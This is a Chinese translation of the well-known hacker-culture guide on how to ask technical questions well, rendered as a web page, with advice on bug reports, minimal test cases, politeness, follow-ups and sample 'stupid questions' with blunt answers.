<p><a class="link"   href="http://www.chiark.greenend.org.uk/~sgtatham/" >Simon Tatham<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>写过一篇名为《<a class="link"   href="http://www.chiark.greenend.org.uk/~sgtatham/bugs-tw.html" >如何有效的报告Bug<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>》的出色文章。强力推荐你也读一读。</p>
<h2 id="话不在多而在精"><a href="#话不在多而在精" class="headerlink" title="话不在多而在精"></a>话不在多而在精</h2><p>你需要提供精确有内容的信息。这并不是要求你简单的把成堆的出错代码或者资料完全转录到你的提问中。如果你有庞大而复杂的测试样例能重现程序挂掉的情境，尽量将它剪裁得越小越好。</p>
<p>这样做的用处至少有三点。</p>
<p>第一，表现出你为简化问题付出了努力，这可以使你得到回答的机会增加；</p>
<p>第二，简化问题使你更有可能得到<em><strong>有用</strong></em>的答案；</p>
<p>第三，在精炼你的bug报告的过程中，你很可能就自己找到了解决方法或权宜之计。</p>
<h2 id="别动辄声称找到Bug"><a href="#别动辄声称找到Bug" class="headerlink" title="别动辄声称找到Bug"></a>别动辄声称找到Bug</h2><p>当你在使用软件中遇到问题，除非你非常、<em><strong>非常</strong></em>的有根据，不要动辄声称找到了Bug。提示：除非你能 提供解决问题的源代码补丁，或者对前一版本的回归测试表现出不正确的行为，否则你都多半不够完全 确信。这同样适用在网页和文件，如果你（声称）发现了文件的 <code>Bug</code> ，你应该能提供相应位置的修正或 替代文件。</p>
<p>请记得，还有许多其它使用者没遇到你发现的问题，否则你在阅读文件或搜索网页时就应该发现了（你在抱怨前<a href="#page3">已经做了这些，是吧</a>？）。这也意味着很有可能是你弄错了而不是软件本身有问题。</p>
<p>编写软件的人总是非常辛苦地使它尽可能完美。如果你声称找到了Bug，也就是在质疑他们的能力，即 使你是对的，也有可能会冒犯到其中某部分人。这尤其严重当你在标题中嚷嚷着有 <code>Bug</code> 。</p>
<p>提问时，即使你私下非常确信已经发现一个真正的Bug，最好写得像是<em><strong>你</strong></em>做错了什么。如果真的有 Bug，你会在回复中看到这点。这样做的话，如果真有Bug，维护者就会向你道歉，这总比你惹恼别人 然后欠别人一个道歉要好一点。</p>
<h2 id="可以低声下气，但还是要先做功课"><a href="#可以低声下气，但还是要先做功课" class="headerlink" title="可以低声下气，但还是要先做功课"></a>可以低声下气，但还是要先做功课</h2><p>有些人明白他们不该粗鲁或傲慢的提问并要求得到答复，但他们选择另一个极端 – 低声下气： <code>我知道我只是个可悲的新手，一个撸瑟，但...</code> 。这既使人困扰，也没有用，尤其是伴随着与实际问题含糊不清的描 述时更令人反感。</p>
<p>别用原始灵长类动物的把戏来浪费你我的时间。取而代之的是，尽可能清楚地描述背景条件和你的问题 情况。这比低声下气更好地定位了你的位置。</p>
<p>有时网页论坛会设有专为新手提问的版面，如果你真的认为遇到了初学者的问题，到那去就是了，但一 样别那么低声下气。</p>
<h2 id="描述问题症状而非猜测"><a href="#描述问题症状而非猜测" class="headerlink" title="描述问题症状而非猜测"></a>描述问题症状而非猜测</h2><p>告诉黑客们你认为问题是怎样造成的并没什么帮助。（如果你的推断如此有效，还用向别人求助 吗？），因此要确信你原原本本告诉了他们问题的症状，而不是你的解释和理论；让黑客们来推测和诊 断。如果你认为陈述自己的猜测很重要，清楚地说明这只是你的猜测，并描述为什么它们不起作用。</p>
<p><em><strong>蠢问题</strong></em></p>
<blockquote>
<p>我在编译内核时接连遇到 SIG11 错误， </p>
<p>我怀疑某条飞线搭在主板的走线上了，这种情况应该怎样检查最好？</p>
</blockquote>
<p><em><strong>聪明问题</strong></em></p>
<blockquote>
<p>我的组装电脑是 FIC-PA2007 主机板搭载 AMD K6&#x2F;233 CPU（威盛 Apollo VP2芯片组）， 256MB Corsair PC133 SDRAM内存，在编译内核时，从开机20分钟以后就频频产生 SIG11 错误， </p>
<p>但是在头20分钟内从没发生过相同的问题。重新启动也没有用，但是关机一晚上就又能工作20分钟。</p>
<p>所有内存都换过了，没有效果。相关部分的标准编译记录如下…。</p>
</blockquote>
<p>由于以上这点似乎让许多人觉得难以配合，这里有句话可以提醒你： <code>所有的诊断专家都来自密苏里州</code>。 美国国务院的官方座右铭则是： <code>让我看看</code> （出自国会议员 Willard D. Vandiver 在1899年时的讲话： <code>我来自一个出产玉米，棉花，牛蒡和民主党人的国家，滔滔雄辩既不能说服我，也不会让我满意。我来自密苏里州，你必须让我看看。</code> ） 针对诊断者而言，这并不是一种怀疑，而只是一种真实而有用的需求，以便让他们看 到的是与你看到的原始证据尽可能一致的东西，而不是你的猜测与归纳的结论。所以，大方的展示给我 们看吧！</p>
<h2 id="按发生时间先后列出问题症状"><a href="#按发生时间先后列出问题症状" class="headerlink" title="按发生时间先后列出问题症状"></a>按发生时间先后列出问题症状</h2><p>问题发生前的一系列操作，往往就是对找出问题最有帮助的线索。因此，你的说明里应该包含你的操作 步骤，以及机器和软件的反应，直到问题发生。在命令行处理的情况下，提供一段操作记录（例如运行 脚本工具所生成的），并引用相关的若干行（如20行）记录会非常有帮助。</p>
<p>如果挂掉的程序有诊断选项（如 -v 的详述开关），试着选择这些能在记录中增加调试信息的选项。记住， <code>多</code> 不等于 <code>好</code> 。试着选取适当的调试级别以便提供有用的信息而不是让读者淹没在垃圾中。</p>
<p>如果你的说明很长（如超过四个段落），在开头简述问题，接下来再按时间顺序详述会有所帮助。这样 黑客们在读你的记录时就知道该注意哪些内容了。</p>
<h2 id="描述目标而不是过程"><a href="#描述目标而不是过程" class="headerlink" title="描述目标而不是过程"></a>描述目标而不是过程</h2><p>如果你想弄清楚如何做某事（而不是报告一个Bug），在开头就描述你的目标，然后才陈述重现你所卡 住的特定步骤。</p>
<p>经常寻求技术帮助的人在心中有个更高层次的目标，而他们在自以为能达到目标的特定道路上被卡住 了，然后跑来问该怎么走，但没有意识到这条路本身就有问题。结果要费很大的劲才能搞定。</p>
<p><strong>蠢问题</strong></p>
<blockquote>
<p>我怎样才能从某绘图程序的颜色选择器中取得十六进制的的RGB值？</p>
</blockquote>
<p><strong>聪明问题</strong></p>
<blockquote>
<p>我正试着用替换一幅图片的色码成自己选定的色码，我现在知道的唯一方法是编辑每个色码区块， 但却无法从某绘图程序的颜色选择器取得十六进制的的RGB值。</p>
</blockquote>
<p>第二种提问法比较聪明，你可能得到像是 <code>建议采用另一个更合适的工具</code> 的回复。</p>
<h2 id="别要求使用私人电邮回复"><a href="#别要求使用私人电邮回复" class="headerlink" title="别要求使用私人电邮回复"></a>别要求使用私人电邮回复</h2><p>黑客们认为问题的解决过程应该公开、透明，此过程中如果更有经验的人注意到不完整或者不当之处， 最初的回复才能够、也应该被纠正。同时，作为提供帮助者也能因为能力和学识被其它同行看到而得到 某种奖励。</p>
<p>当你要求私下回复时，这个过程和奖励都被中止。别这样做，让<em><strong>回复者</strong></em>来决定是否私下回答 – 如果他真 这么做了，通常是因为他认为问题编写太差或者太肤浅，以至于对其它人没有兴趣。</p>
<p>这条规则存在一条有限的例外，如果你确信提问可能会引来大量雷同的回复时，那么这个神奇的提问句 <code>会是向我发电邮，我将为论坛归纳这些回复</code> 。试着将邮件列表或新闻群组从洪水般的雷同回复中解救出来 是非常有礼貌的 – 但你必须信守诺言。</p>
<h2 id="清楚明确的表达你的问题以及需求"><a href="#清楚明确的表达你的问题以及需求" class="headerlink" title="清楚明确的表达你的问题以及需求"></a>清楚明确的表达你的问题以及需求</h2><p>漫无边际的提问近乎无休无止的时间黑洞。最有可能给你有用答案的人通常也正是最忙的人（他们忙是 因为要亲自完成大部分工作）。这样的人对无节制的时间黑洞相当厌恶，所以他们也倾向于厌恶那些漫 无边际的提问。</p>
<p>如果你明确表述需要回答者做什么（如提供指点、发送一段代码、检查你的补丁、或是其他等等），就 最有可能得到有用的答案。因为这会定出一个时间和精力的上限，便于回答者能集中精力来帮你。这么 做很棒。</p>
<p>要理解专家们所处的世界，请把专业技能想像为充裕的资源，而回复的时间则是稀缺的资源。你要求他 们奉献的时间越少，你越有可能从真正专业而且很忙的专家那里得到解答。</p>
<p>所以，界定一下你的问题，使专家花在辨识你的问题和回答所需要付出的时间减到最少，这技巧对你有 用答案相当有帮助 – 但这技巧通常和简化问题有所区别。因此，问 <code>我想更好的理解X，可否指点一下哪有好 一点说明？</code> 通常比问 <code>你能解释一下X吗？</code> 更好。如果你的代码不能运作，通常请别人看看哪里有问题，比 要求别人替你改正要明智得多。</p>
<h2 id="询问有关代码的问题时"><a href="#询问有关代码的问题时" class="headerlink" title="询问有关代码的问题时"></a>询问有关代码的问题时</h2><p>别要求他人帮你有问题的代码调试而不提示一下应该从何入手。张贴几百行的代码，然后说一声： <code>它不会动</code> 会让你完全被忽略。只贴几十行代码，然后说一句： <code>在第七行以后，我期待它显示&lt;x&gt; ，但实际出现的是&lt;y&gt;比较有可能让你得到回应</code>。</p>
<p>最有效描述程序问题的方法是提供最精简的Bug展示测试示例（bug-demonstrating test case）。什么是最精简的测试示例? 那是问题的缩影；一小个程序片段能<strong>刚好</strong>展示出程序的异常行为，而不包含其他令人分散注意力的内容。怎么制作最精简的测试示例？如果你知道哪一行或哪一段代码会造成异常的行为，复制下来并加入足够重现这个状况的代码（例如，足以让这段代码能被编译&#x2F;直译&#x2F;被应用程序处理）。如果你无法将问题缩减到一个特定区块，就复制一份代码并移除不影响产生问题行为的部分。总之，测试示例越小越好（查看<a href="#%E8%AF%9D%E4%B8%8D%E5%9C%A8%E5%A4%9A%E8%80%8C%E5%9C%A8%E7%B2%BE">话不在多而在精</a>一节）。</p>
<p>一般而言，要得到一段相当精简的测试示例并不太容易，但永远先尝试这样做的是种好习惯。这种方式可以帮助你了解如何自行解决这个问题 —- 而且即使你的尝试不成功，黑客们也会看到你在尝试取得答案的过程中付出了努力，这可以让他们更愿意与你合作。</p>
<p>如果你只是想让别人帮忙审查（Review）一下代码，在信的开头就要说出来，并且一定要提到你认为哪一部分特别需要关注以及为什么。</p>
<h2 id="别把自己家庭作业的问题贴上来"><a href="#别把自己家庭作业的问题贴上来" class="headerlink" title="别把自己家庭作业的问题贴上来"></a>别把自己家庭作业的问题贴上来</h2><p>黑客们很擅长分辨哪些问题是家庭作业式的问题；因为我们中的大多数都曾自己解决这类问题。同样， 这些问题得由<em><strong>你</strong></em>来搞定，你会从中学到东西。你可以要求给点提示，但别要求得到完整的解决方案。</p>
<p>如果你怀疑自己碰到了一个家庭作业式的问题，但仍然无法解决，试试在<em><strong>使用者</strong></em>群组，论坛或（最后一 招）在项目的使用者邮件列表或论坛中提问。尽管黑客们<em><strong>会</strong></em>看出来，但一些有经验的使用者也许仍会给 你一些提示。</p>
<h2 id="去掉无意义的提问句"><a href="#去掉无意义的提问句" class="headerlink" title="去掉无意义的提问句"></a>去掉无意义的提问句</h2><p>避免用无意义的话结束提问，例如<code>有人能帮我吗？</code> 或者<code>这有答案吗？</code> 。</p>
<p>首先：如果你对问题的描述不是很好，这样问更是画蛇添足。</p>
<p>其次：由于这样问是画蛇添足，黑客们会很厌烦你 – 而且通常会用逻辑上正确，但毫无意义的回答来表示他们的蔑视， 例如：<code>没错，有人能帮你</code> 或者<code>不，没答案</code> 。</p>
<p>一般来说，避免用 <code>是或否</code> 、<code>对或错</code> 、<code>有或没有</code> 类型的问句，除非你想得到<a class="link"   href="http://homepage.ntlworld.com./jonathan.deboynepollard/FGA/questions-with-yes-or-no-answers.html" >是或否类型的回答<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<h2 id="即使你很急也不要在标题写紧急"><a href="#即使你很急也不要在标题写紧急" class="headerlink" title="即使你很急也不要在标题写紧急"></a>即使你很急也不要在标题写<code>紧急</code></h2><p>这是你的问题，不是我们的。宣称 <code>紧急</code> 极有可能事与愿违：大多数黑客会直接删除无礼和自私地企图即 时引起关注的问题。更严重的是， <code>紧急</code> 这个字（或是其他企图引起关注的标题）通常会被垃圾信过滤器 过滤掉 – 你希望能看到你问题的人可能永远也看不到。</p>
<p>有半个例外的情况是，如果你是在一些很高调，会使黑客们兴奋的地方，也许值得这样去做。在这种情 况下，如果你有时间压力，也很有礼貌地提到这点，人们也许会有兴趣回答快一点。</p>
<p>当然，这风险很大，因为黑客们兴奋的点多半与你的不同。譬如从 NASA 国际空间站（International Space Station）发这样的标题没有问题，但用自我感觉良好的慈善行为或政治原因发肯定不行。事实 上，张贴诸如 <code>紧急：帮我救救这个毛绒绒的小海豹！</code> 肯定让你被黑客忽略或惹恼他们，即使他们认为毛绒 绒的小海豹很重要。</p>
<h2 id="礼多人不怪，而且有时还很有帮助"><a href="#礼多人不怪，而且有时还很有帮助" class="headerlink" title="礼多人不怪，而且有时还很有帮助"></a>礼多人不怪，而且有时还很有帮助</h2><p>彬彬有礼，多用 <code>请</code> 和 <code>谢谢您的关注</code> ，或 <code>谢谢你的关照</code> 。让大家都知道你对他们花时间免费提供帮助心存感激。</p>
<p>坦白说，这一点并没有比清晰、正确、精准并合法语法和避免使用专用格式重要（也不能取而代之）。 黑客们一般宁可读有点唐突但技术上鲜明的Bug报告，而不是那种有礼但含糊的报告。（如果这点让你 不解，记住我们是按问题能教我们什么来评价问题的价值的）</p>
<p>然而，如果你有一串的问题待解决，客气一点肯定会增加你得到有用回应的机会。</p>
<p> （我们注意到，自从本指南发布后，从资深黑客那里得到的唯一严重缺陷反馈，就是对预先道谢这一 条。一些黑客觉得 <code>先谢了</code> 意味着事后就不用再感谢任何人的暗示。我们的建议是要么先说 <code>先谢了</code> ，然后 事后再对回复者表示感谢，或者换种方式表达感激，譬如用 <code>谢谢你的关注</code> 或 <code>谢谢你的关照</code> 。）</p>
<h2 id="问题解决后，加个简短的补充说明"><a href="#问题解决后，加个简短的补充说明" class="headerlink" title="问题解决后，加个简短的补充说明"></a>问题解决后，加个简短的补充说明</h2><p>问题解决后，向所有帮助过你的人发个说明，让他们知道问题是怎样解决的，并再一次向他们表示感谢。如果问题在新闻组或者邮件列表中引起了广泛关注，应该在那里贴一个说明比较恰当。</p>
<p>最理想的方式是向最初提问的话题回复此消息，并在标题中包含<code>已修正</code> ，已解决 或其它同等含义的明显标记。在人来人往的邮件列表里，一个看见讨论串<code>问题 X</code> 和<code>问题的X - 已解决</code> 的潜在回复者就明白不用再浪费时间了（除非他个人觉得<code>问题 X</code> 的有趣），因此可以利用此时间去解决其它问题。</p>
<p>补充说明不必很长或是很深入；简单的一句你<code>好，原来是网线出了问题！谢谢大家 – Bill</code> 比什么也不说要来的好。事实上，除非结论真的很有技术含量，否则简短可爱的小结比长篇大论更好。说明问题是怎样解决的，但大可不必将解决问题的过程复述一遍。</p>
<p>对于有深度的问题，张贴调试记录的摘要是有帮助的。描述问题的最终状态，说明是什么解决了问题， 在此<em><strong>之后</strong></em>才指明可以避免的盲点。避免盲点的部分应放在正确的解决方案和其它总结材料之后，而不要 将此信息搞成侦探推理小说。列出那些帮助过你的名字，会让你交到更多朋友。</p>
<p>除了有礼貌和有内涵以外，这种类型的补充也有助于他人在邮件列表&#x2F;新闻群组&#x2F;论坛中搜索到真正解决你问题的方案，让他们也从中受益。</p>
<p>至少，这种补充有助于让每位参与协助的人因问题的解决而从中得到满足感。如果你自己不是技术专家或者黑客，那就相信我们，这种感觉对于那些你向他们求助的大师或者专家而言，是非常重要的。问题悬而未决会让人灰心；黑客们渴望看到问题被解决。好人有好报，满足他们的渴望，你会在下次提问时尝到甜头。</p>
<p>思考一下怎样才能避免他人将来也遇到类似的问题，自问写一份文件或加个常见问题（FAQ）会不会有帮助。如果是的话就将它们发给维护者。</p>
<p>在黑客中，这种良好的后继行动实际上比传统的礼节更为重要，也是你如何透过善待他人而赢得声誉的方式，这是非常有价值的资产。</p>
<h2 id="如何解读答案"><a href="#如何解读答案" class="headerlink" title="如何解读答案"></a>如何解读答案</h2><h3 id="RTFM和STFW：如何知道你已完全搞砸了"><a href="#RTFM和STFW：如何知道你已完全搞砸了" class="headerlink" title="RTFM和STFW：如何知道你已完全搞砸了"></a>RTFM和STFW：如何知道你已完全搞砸了</h3><p>有一个古老而神圣的传统：如果你收到 <code>RTFM （Read The Fucking Manual）</code> 的回应，回答者认为<strong>你应该去读他妈的手册</strong>。当然，基本上他是对的，你应该去读一读。</p>
<p>RTFM 有一个年轻的亲戚。如果你收到 <code>STFW（Search The Fucking Web）</code> 的回应，回答者认为你<strong>应该到他妈的网上搜索</strong>过了。那人多半也是对的，去搜索一下吧。（更温和一点的说法是<a class="link"   href="http://lmgtfy.com/" >Google是你的朋友<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></p>
<p>在论坛，你也可能被要求去爬爬论坛的旧文。事实上，有人甚至可能热心地为你提供以前解决此问题的讨论串。但不要依赖这种关照，提问前应该先搜索一下旧文。</p>
<p>通常，用这两句之一回答你的人会给你一份包含你需要内容的手册或者一个网址，而且他们打这些字的时候也正在读着。这些答复意味着回答者认为</p>
<ul>
<li>你需要的信息非常容易获得； </li>
<li>你自己去搜索这些信息比灌给你能让你学到更多。</li>
</ul>
<p>你不应该因此不爽；<strong>依照黑客的标准，他已经表示了对你一定程度的关注，而没有对你的要求视而不见</strong>。你应该对他祖母般的慈祥表示感谢。</p>
<h3 id="如果还是搞不懂"><a href="#如果还是搞不懂" class="headerlink" title="如果还是搞不懂"></a>如果还是搞不懂</h3><p>如果你看不懂回应，别立刻要求对方解释。像你以前试着自己解决问题时那样（利用手册，FAQ，网 络，身边的高手），先试着去搞懂他的回应。如果你真的需要对方解释，记得表现出你已经从中学到了 点什么。</p>
<p>比方说，如果我回答你： <code>看来似乎是 zentry 卡住了；你应该先清除它。</code> ，然后，这是一个<em><strong>很糟的</strong></em>后续问 题回应： <code>zentry是什么？</code> 好的问法应该是这样： <code>哦~~~我看过说明了但是只有 -z 和 -p 两个参数中提到了 zentries，而且还都没有清楚的解释如何清除它。你是指这两个中的哪一个吗？还是我看漏了什么？</code></p>
<h3 id="处理无礼的回应"><a href="#处理无礼的回应" class="headerlink" title="处理无礼的回应"></a>处理无礼的回应</h3><p>很多黑客圈子中看似无礼的行为并不是存心冒犯。相反，它是直接了当，一针见血式的交流风格，这种 风格更注重解决问题，而不是使人感觉舒服而却模模糊糊。</p>
<p>如果你觉得被冒犯了，试着平静地反应。如果有人真的做了出格的事，邮件列表、新闻群组或论坛中的 前辈多半会招呼他。如果这<em><strong>没有</strong></em>发生而你却发火了，那么你发火对象的言语可能在黑客社区中看起来是 正常的，而你将被视为有错的一方，这将伤害到你获取信息或帮助的机会。</p>
<p>另一方面，你偶而真的会碰到无礼和无聊的言行。与上述相反，对真正的冒犯者狠狠地打击，用犀利的 语言将其驳得体无完肤都是可以接受的。然而，在行事之前一定要非常非常的有根据。纠正无礼的言论 与开始一场毫无意义的口水战仅一线之隔，黑客们自己莽撞地越线的情况并不鲜见。如果你是新手或外 人，避开这种莽撞的机会并不高。如果你想得到的是信息而不是消磨时光，这时最好不要把手放在键盘 上以免冒险。</p>
<p>（有些人断言很多黑客都有轻度的自闭症或亚斯伯格综合症，缺少用于润滑人类社会<strong>正常</strong>交往所需的神 经。这既可能是真也可能是假的。如果你自己不是黑客，兴许你认为我们脑袋有问题还能帮助你应付我 们的古怪行为。只管这么干好了，我们不在乎。我们<strong>喜欢</strong>我们现在这个样子，并且通常对病患标记都有 站得住脚的怀疑。）</p>
<p>在下一节，我们会谈到另一个问题，当<em><strong>你</strong></em>行为不当时所会受到的 <code>冒犯</code> 。</p>
<h2 id="如何避免扮演失败者"><a href="#如何避免扮演失败者" class="headerlink" title="如何避免扮演失败者"></a>如何避免扮演失败者</h2><p>黑客社区的论坛中有那么几次你可能会搞砸 – 以本指南所描述到的或类似的方式。而你会在公开场合中被告知你是如何搞砸的，也许攻击的言语中还会带点夹七夹八的颜色。</p>
<p>这种事发生以后，你能做的最糟糕的事莫过于哀嚎你的遭遇、宣称被口头攻击、要求道歉、高声尖叫、憋闷气、威胁诉诸法律、向其雇主报怨、忘了关马桶盖等等。相反地，你该这么做：</p>
<p>熬过去，这很正常。事实上，它是有益健康且合理的。</p>
<p>社区的标准不会自行维持，它们是通过参与者积极而<em><strong>公开地</strong></em>执行来维持的。不要哭嚎所有的批评都应该 通过私下的邮件传送，它不是这样运作的。当有人评论你的一个说法有误或者提出不同看法时，坚持声 称受到个人攻击也毫无益处，这些都是失败者的态度。</p>
<p>也有其它的黑客论坛，受过高礼节要求的误导，禁止参与者张贴任何对别人帖子挑毛病的消息，并声称 <code>如果你不想帮助用户就闭嘴。</code> 结果造成有想法的参与者纷纷离开，这么做只会使它们沦为毫无意义的嘮叨 与无用的技术论坛。</p>
<p>夸张的讲法是：你要的是<strong>友善</strong>（以上述方式）还是有用？两个里面挑一个。</p>
<p>记着：当黑客说你搞砸了，并且（无论多么刺耳）告诉你别再这样做时，他正在为关心<strong>你</strong>和<strong>他的社区</strong>而行动。对他而言，不理你并将你从他的生活中滤掉更简单。如果你无法做到感谢，至少要表现地有点尊 严，别大声哀嚎，也别因为自己是个有戏剧性超级敏感的灵魂和自以为有资格的新来者，就指望别人像 对待脆弱的洋娃娃那样对你。</p>
<p>有时候，即使你没有搞砸（或者只是在他的想像中你搞砸了），有些人也会无缘无故地攻击你本人。在这种情况下，抱怨倒是<strong>真的</strong>会把问题搞砸。</p>
<p>这些来找麻烦的人要么是毫无办法但自以为是专家的不中用家伙，要么就是测试你是否真会搞砸的心理 专家。其它读者要么不理睬，要么用自己的方式对付他们。这些来找麻烦的人在给他们自己找麻烦，这 点你不用操心。</p>
<p>也别让自己卷入口水战，最好不要理睬大多数的口水战 – 当然，是在你检验它们只是口水战，而并未指 出你有搞砸的地方，且也没有巧妙地将问题真正的答案藏于其后（这也是有可能的）。</p>
<h2 id="不该问的问题"><a href="#不该问的问题" class="headerlink" title="不该问的问题"></a>不该问的问题</h2><p>以下是几个经典蠢问题，以及黑客没回答时心中所想的：</p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E8%83%BD%E5%9C%A8%E5%93%AA%E6%89%BE%E5%88%B0X%E7%A8%8B%E5%BA%8F%E6%88%96X%E8%B5%84%E6%BA%90%EF%BC%9F">我能在哪找到 X 程序或 X 资源？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E6%80%8E%E6%A0%B7%E7%94%A8X%E5%81%9AY%EF%BC%9F">我怎样用 X 做 Y？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E5%A6%82%E4%BD%95%E8%AE%BE%E5%AE%9A%E6%88%91%E7%9A%84shell%E6%8F%90%E7%A4%BA%EF%BC%9F">如何设定我的 shell 提示？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E5%8F%AF%E4%BB%A5%E7%94%A8Bass-o-matic%E6%96%87%E4%BB%B6%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7%E5%B0%86AcmeCorp%E6%A1%A3%E6%A1%88%E8%BD%AC%E6%8D%A2%E4%B8%BATeX%E6%A0%BC%E5%BC%8F%E5%90%97%EF%BC%9F">我可以用 Bass-o-matic 文件转换工具将 AcmeCorp 档案转换为 TeX 格式吗？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E7%9A%84%E7%A8%8B%E5%BA%8F%E3%80%81%E8%AE%BE%E5%AE%9A%E3%80%81SQL%E8%AF%AD%E5%8F%A5%E6%B2%A1%E6%9C%89%E7%94%A8">我的程序、设定、SQL语句没有用</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E7%9A%84Windows%E7%94%B5%E8%84%91%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E4%BD%A0%E8%83%BD%E5%B8%AE%E6%88%91%E5%90%97%EF%BC%9F">我的 Windows 电脑有问题，你能帮我吗？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E7%9A%84%E7%A8%8B%E5%BA%8F%E4%B8%8D%E4%BC%9A%E5%8A%A8%E4%BA%86%EF%BC%8C%E6%88%91%E8%AE%A4%E4%B8%BA%E7%B3%BB%E7%BB%9F%E5%B7%A5%E5%85%B7X%E6%9C%89%E9%97%AE%E9%A2%98">我的程序不会动了，我认为系统工具 X 有问题</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E5%9C%A8%E5%AE%89%E8%A3%85Linux%EF%BC%88%E6%88%96%E8%80%85X%EF%BC%89%E6%97%B6%E6%9C%89%E9%97%AE%E9%A2%98%EF%BC%8C%E4%BD%A0%E8%83%BD%E5%B8%AE%E6%88%91%E5%90%97%EF%BC%9F">我在安装 Linux（或者 X ）时有问题，你能帮我吗？</a></p>
<p>问题：<a href="#%E9%97%AE%E9%A2%98%EF%BC%9A%E6%88%91%E6%80%8E%E4%B9%88%E6%89%8D%E8%83%BD%E7%A0%B4%E8%A7%A3root%E5%B8%90%E5%8F%B7%E3%80%81%E7%AA%83%E5%8F%96OP%E7%89%B9%E6%9D%83%E3%80%81%E8%AF%BB%E5%88%AB%E4%BA%BA%E7%9A%84%E9%82%AE%E4%BB%B6%E5%91%A2%EF%BC%9F">我怎么才能破解 root 帐号&#x2F;窃取 OP 特权&#x2F;读别人的邮件呢？</a></p>
<hr>
<blockquote>
<h6 id="问题：我能在哪找到X程序或X资源？"><a href="#问题：我能在哪找到X程序或X资源？" class="headerlink" title="问题：我能在哪找到X程序或X资源？"></a>问题：我能在哪找到X程序或X资源？</h6></blockquote>
<p>回答：就在我找到它的地方啊，白痴 – 搜索引擎的那一头。天哪！难道还有人不会用 <a class="link"   href="http://www.google.com/" >Google <i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>吗？</p>
<blockquote>
<h6 id="问题：我怎样用X做Y？"><a href="#问题：我怎样用X做Y？" class="headerlink" title="问题：我怎样用X做Y？"></a>问题：我怎样用X做Y？</h6></blockquote>
<p>回答：如果你想解决的是 Y ，提问时别给出可能并不恰当的方法。这种问题说明提问者不但对 X 完全无知，也对 Y 要解决的问题糊涂，还被特定形势禁锢了思维。最好忽略这种人，等他们把问题搞清楚了再说。</p>
<blockquote>
<h6 id="问题：如何设定我的shell提示？"><a href="#问题：如何设定我的shell提示？" class="headerlink" title="问题：如何设定我的shell提示？"></a>问题：如何设定我的shell提示？</h6></blockquote>
<p>回答：如果你有足够的智慧提这个问题，你也该有足够的智慧去 RTFM，然后自己去找出来。</p>
<blockquote>
<h6 id="问题：我可以用Bass-o-matic文件转换工具将AcmeCorp档案转换为TeX格式吗？"><a href="#问题：我可以用Bass-o-matic文件转换工具将AcmeCorp档案转换为TeX格式吗？" class="headerlink" title="问题：我可以用Bass-o-matic文件转换工具将AcmeCorp档案转换为TeX格式吗？"></a>问题：我可以用Bass-o-matic文件转换工具将AcmeCorp档案转换为TeX格式吗？</h6></blockquote>
<p>回答：试试看就知道了。如果你试过，你既知道了答案，就不用浪费我的时间了。</p>
<blockquote>
<h6 id="问题：我的程序、设定、SQL语句没有用"><a href="#问题：我的程序、设定、SQL语句没有用" class="headerlink" title="问题：我的程序、设定、SQL语句没有用"></a>问题：我的程序、设定、SQL语句没有用</h6></blockquote>
<p>回答：这不算是问题吧，我对要我问你二十个问题才找得出你真正问题的问题没兴趣 – 我有更有意思的 事要做呢。在看到这类问题的时候，我的反应通常不外如下三种</p>
<ul>
<li>你还有什么要补充的吗？ </li>
<li>真糟糕，希望你能搞定。 </li>
<li>这关我有什么屁事？</li>
</ul>
<blockquote>
<h6 id="问题：我的Windows电脑有问题，你能帮我吗？"><a href="#问题：我的Windows电脑有问题，你能帮我吗？" class="headerlink" title="问题：我的Windows电脑有问题，你能帮我吗？"></a>问题：我的Windows电脑有问题，你能帮我吗？</h6></blockquote>
<p>回答：能啊，扔掉萎软的垃圾，换个像 Linux 或 BSD 的开放源代码操作系统吧。</p>
<p>注意：如果程序有官方版 Windows 或者与 Windows 有互动（如Samba），你<em><strong>可以</strong></em>问与Windows相关 的问题， 只是别对问题是由 Windows 操作系统而不是程序本身造成的回复感到惊讶， 因为 Windows 一般来说实在太烂，这种说法通常都是对的。</p>
<blockquote>
<h6 id="问题：我的程序不会动了，我认为系统工具X有问题"><a href="#问题：我的程序不会动了，我认为系统工具X有问题" class="headerlink" title="问题：我的程序不会动了，我认为系统工具X有问题"></a>问题：我的程序不会动了，我认为系统工具X有问题</h6></blockquote>
<p>回答：你完全有可能是第一个注意到被成千上万用户反复使用的系统调用与函数库档案有明显缺陷的 人，更有可能的是你完全没有根据。不同凡响的说法需要不同凡响的证据，当你这样声称时，你必须有 清楚而详尽的缺陷说明文件作后盾。</p>
<blockquote>
<h6 id="问题：我在安装Linux（或者X）时有问题，你能帮我吗？"><a href="#问题：我在安装Linux（或者X）时有问题，你能帮我吗？" class="headerlink" title="问题：我在安装Linux（或者X）时有问题，你能帮我吗？"></a>问题：我在安装Linux（或者X）时有问题，你能帮我吗？</h6></blockquote>
<p>回答：不能，我只有亲自在你的电脑上动手才能找到毛病。还是去找你当地的 Linux 使用群组者寻求实际的指导吧（你能在<a class="link"   href="http://www.linux.org/groups/index.html" >这儿<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>找到使用者群组的清单）。</p>
